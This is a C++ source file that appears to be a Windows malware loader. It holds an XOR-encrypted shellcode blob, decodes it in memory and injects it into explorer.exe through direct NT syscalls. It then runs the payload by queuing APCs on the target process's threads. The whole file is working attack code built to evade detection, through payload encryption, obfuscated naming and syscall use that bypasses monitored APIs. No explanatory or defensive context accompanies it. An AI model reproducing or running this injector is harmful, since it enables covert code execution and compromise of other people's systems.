#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>
#include <vector>
#include "syscalls_all.h"
#include <stdio.h>

int main()
{

    unsigned char encryptedsh3llcode[] = "\xaf\x3d\xf3\x81\x82\xbb\xa9\x63\x75\x72\x24\x1a\x24\x29\x01"
           "\x24\x26\x2d\x43\x81\x00\x2b\xfe\x20\x05\x03\xee\x2b\x4b\x3d"
           "\xfb\x37\x52\x1b\x6a\xd4\x3f\x38\x28\x7a\xac\x31\xd8\x07\x20"
           "\x2d\x43\x93\xc9\x5f\x14\x0e\x67\x67\x45\x38\x92\xbc\x7d\x24"
           "\x73\x92\x87\x8e\x27\x3a\xee\x19\x45\xf2\x11\x49\x38\x64\xa2"
           "\x35\xe4\x1b\x6d\x79\x67\x0a\x34\x76\xd6\x07\x70\x65\x72\xd8"
           "\xe5\xeb\x75\x72\x65\x03\xe0\xb9\x27\x12\x38\x64\xa2\x17\xee"
           "\x23\x55\xf9\x2d\x53\x2c\x78\x83\x25\x93\x33\x3a\xac\xac\x22"
           "\xfe\x46\xed\x03\x64\xaf\x1e\x44\xb9\x2d\x43\x93\xc9\x22\xb4"
           "\xbb\x68\x0a\x64\xb8\x6b\x95\x05\x94\x3e\x50\x29\x47\x7d\x37"
           "\x5c\x9a\x10\xa1\x0b\x31\xfb\x25\x56\x1a\x64\xb3\x13\x33\xee"
           "\x47\x2d\x3d\xd8\x35\x6c\x2c\x73\x83\x24\xe8\x71\xfa\x24\x13"
           "\x2d\x78\x83\x34\x28\x3b\x2b\x09\x24\x3b\x34\x2b\x24\x11\x2d"
           "\xfa\xbf\x55\x31\x37\x8d\xb3\x3d\x22\x2c\x28\x2d\xc0\x77\x90"
           "\x18\x8a\x8f\x9a\x2f\x1a\xdb\x14\x06\x40\x3a\x78\x57\x79\x53"
           "\x34\x26\x2c\xfb\xb5\x2d\xe2\x99\xd2\x64\x4b\x65\x30\xda\x90"
           "\x39\xd9\x70\x53\x65\x33\xb5\xda\xb6\xca\x24\x2d\x1a\xfc\x94"
           "\x29\xfb\xa2\x24\xd9\x39\x05\x43\x4c\x9a\xac\x1f\xfc\x9a\x0d"
           "\x73\x52\x65\x63\x2c\x33\xdf\x62\xe5\x12\x53\x8a\xa5\x0f\x78"
           "\x12\x3b\x33\x25\x3f\x54\x82\x28\x48\x93\x3d\x8f\xa5\x3a\xda"
           "\xa7\x2b\x8a\xb2\x2d\xc2\xa4\x38\xe9\x9f\x7f\xba\x92\xac\xb0"
           "\x2b\xfc\xb5\x0f\x5b\x24\x21\x1f\xfc\x92\x2d\xfb\xaa\x24\xd9"
           "\xec\xd7\x11\x2a\x9a\xac\xd6\xb5\x04\x6f\x3b\xac\xab\x16\x90"
           "\x9a\xf6\x4b\x65\x79\x1b\xf6\x9c\x75\x3a\xda\x87\x2e\x44\xbb"
           "\x0f\x4f\x24\x21\x1b\xfc\x89\x24\xc8\x51\xbc\xab\x2a\x8d\xb0"
           "\xc8\x9d\x79\x2d\x20\x38\xe6\xb6\x73\x3b\xea\x83\x18\x25\x0a"
           "\x3c\x11\x53\x65\x70\x65\x33\x0b\x2d\xea\x87\x3a\x54\x82\x24"
           "\xc3\x0b\xd1\x23\x80\x8d\x86\x2d\xea\xb6\x3b\xec\x8c\x28\x48"
           "\x9a\x3c\xf9\x95\x3a\xda\xbf\x2b\xfc\x8b\x24\xf1\x67\xa0\x9b"
           "\x2a\x8f\xb0\xf1\xab\x65\x1e\x5d\x2a\x24\x1c\x3c\x11\x53\x35"
           "\x70\x65\x33\x0b\x0f\x63\x2f\x33\xdf\x40\x4a\x76\x63\x8a\xa5"
           "\x32\x2b\x12\xdf\x16\x1b\x3f\x04\xb4\xb0\x30\xac\xbb\x99\x59"
           "\x8d\xac\x9a\x2b\x74\xb1\x2d\x62\xa3\x31\xd6\x83\x05\xd1\x33"
           "\xac\x82\x3b\x1f\x72\x3c\xf0\x85\x64\x79\x7f\x31\xec"
               "\xa8\xac\xb0";
    char key[] = "SuperSecureKey";
    char cipherType[] = "xor";

    // Char array to host the deciphered sh3llcode
    char sh3llcode[sizeof encryptedsh3llcode];


     //XOR decoding stub using the key defined above must be the same as the encoding key
    int j = 0;
    for (int i = 0; i < sizeof encryptedsh3llcode; i++) {
        if (j == sizeof key - 1) j = 0;

        sh3llcode[i] = encryptedsh3llcode[i] ^ key[j];
        j++;
    }

    LPVOID allocation_start;
    SIZE_T allocation_size = sizeof(sh3llcode);
    HANDLE hThread;
    HANDLE hProcess;

    HANDLE processsnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);
    PROCESSENTRY32 processEntry = { sizeof(PROCESSENTRY32) };
    DWORD dwProcessId;

    if (Process32First(processsnapshot, &processEntry)) {
        while (_wcsicmp(processEntry.szExeFile, L"explorer.exe") != 0) {
            Process32Next(processsnapshot, &processEntry);
        }
    }
    dwProcessId = processEntry.th32ProcessID;

    OBJECT_ATTRIBUTES pObjectAttributes;
    InitializeObjectAttributes(&pObjectAttributes, NULL, NULL, NULL, NULL);

    CLIENT_ID pClientId;
    pClientId.UniqueProcess = (PVOID)processEntry.th32ProcessID;
    pClientId.UniqueThread = (PVOID)0;

    allocation_start = nullptr;
    NtOpenProcess(&hProcess, MAXIMUM_ALLOWED, &pObjectAttributes, &pClientId);
    NtAllocateVirtualMemory(hProcess, &allocation_start, 0, (PULONG)&allocation_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    NtWriteVirtualMemory(hProcess, allocation_start, sh3llcode, sizeof(sh3llcode), 0);


    THREADENTRY32 threadEntry = { sizeof(THREADENTRY32) };
    std::vector<DWORD> threadIds;
    if (Thread32First(processsnapshot, &threadEntry)) {
        do {
            if (threadEntry.th32OwnerProcessID == processEntry.th32ProcessID) {
                threadIds.push_back(threadEntry.th32ThreadID);
            }
        } while (Thread32Next(processsnapshot, &threadEntry));
    }


    int count = 0;
    for (DWORD threadId : threadIds) {

        OBJECT_ATTRIBUTES tObjectAttributes;
        InitializeObjectAttributes(&tObjectAttributes, NULL, NULL, NULL, NULL);

        CLIENT_ID tClientId;
        tClientId.UniqueProcess = (PVOID)dwProcessId;
        tClientId.UniqueThread = (PVOID)threadId;

        NtOpenThread(&hThread, MAXIMUM_ALLOWED, &tObjectAttributes, &tClientId);
        NtSuspendThread(hThread, NULL);
        NtQueueApcThread(hThread, (PKNORMAL_ROUTINE)allocation_start, allocation_start, NULL, NULL);
        NtResumeThread(hThread, NULL);
        count++;

        if (count == 3) {
            break;
        }
    }
}